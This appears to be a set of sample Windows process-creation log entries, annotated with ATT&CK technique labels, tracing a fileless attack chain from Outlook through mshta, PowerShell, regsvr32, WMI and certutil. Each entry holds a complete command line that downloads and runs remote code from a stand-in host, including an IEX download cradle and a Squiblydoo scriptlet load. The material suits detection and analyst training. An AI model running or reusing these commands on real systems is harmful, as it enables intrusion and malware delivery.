message: A new process has been created. Creator Subject: Account Name: alice Account Domain: CORP Logon ID: 0x7A1B44. Process Information: New Process ID: 0x1D08 New Process Name: C:\Windows\System32\mshta.exe Token Elevation Type: TokenElevationTypeDefault (1) Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE Process Command Line: mshta.exe https://203.0.113.99/stage1.hta. LOLBAS initial access via mshta.exe (T1218.005) — Outlook spawning mshta to execute remote HTA file. HTA file runs VBScript that downloads stage2 payload. No malicious binary touched disk.

A new process has been created. Creator Subject: Account Name: alice Account Domain: CORP Logon ID: 0x7A1B44. Process Information: New Process ID: 0x1E44 New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Token Elevation Type: TokenElevationTypeDefault (1) Creator Process Name: C:\Windows\System32\mshta.exe Process Command Line: powershell.exe -w hidden -NoP -NonI -Ep Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/stage2.ps1')". mshta.exe spawning PowerShell with download cradle. IEX (Invoke-Expression) executes stage2 directly in memory — fileless execution, no stage2.ps1 written to disk.

A new process has been created. Creator Subject: Account Name: alice Account Domain: CORP Logon ID: 0x7A1B44. Process Information: New Process ID: 0x1F88 New Process Name: C:\Windows\System32\regsvr32.exe Token Elevation Type: TokenElevationTypeDefault (1) Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Process Command Line: regsvr32.exe /s /n /u /i:http://203.0.113.99/payload.sct scrobj.dll. Squiblydoo (T1218.010) — regsvr32 loading remote scriptlet via COM to execute payload. Bypasses application whitelisting as regsvr32.exe is a trusted signed Microsoft binary. scrobj.dll = Windows Script Component Runtime.

A new process has been created. Creator Subject: Account Name: alice Account Domain: CORP Logon ID: 0x7A1B44. Process Information: New Process ID: 0x20F4 New Process Name: C:\Windows\System32\wmic.exe Token Elevation Type: TokenElevationTypeDefault (1) Creator Process Name: C:\Windows\System32\regsvr32.exe Process Command Line: wmic.exe process call create "powershell.exe -w hidden -c $env:comspec[4,15,25]-Join'' | iex". WMI process creation (T1047) to spawn PowerShell obfuscated via environment variable string slicing — $env:comspec[4,15,25] = 'iex'. Executing inline command through WMI parent to evade parent-child detection rules.

A new process has been created. Creator Subject: Account Name: alice Account Domain: CORP Logon ID: 0x7A1B44. Process Information: New Process ID: 0x2244 New Process Name: C:\Windows\System32\certutil.exe Token Elevation Type: TokenElevationTypeDefault (1) Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Process Command Line: certutil.exe -urlcache -split -f http://203.0.113.99/agent.b64 C:\Users\alice\AppData\Roaming\Microsoft\agent.b64 && certutil.exe -decode C:\Users\alice\AppData\Roaming\Microsoft\agent.b64 C:\Users\alice\AppData\Roaming\Microsoft\agent.exe. Ingress tool transfer (T1105) via certutil: download base64-encoded agent then decode to executable. Certutil is a trusted Windows binary bypassing download controls.
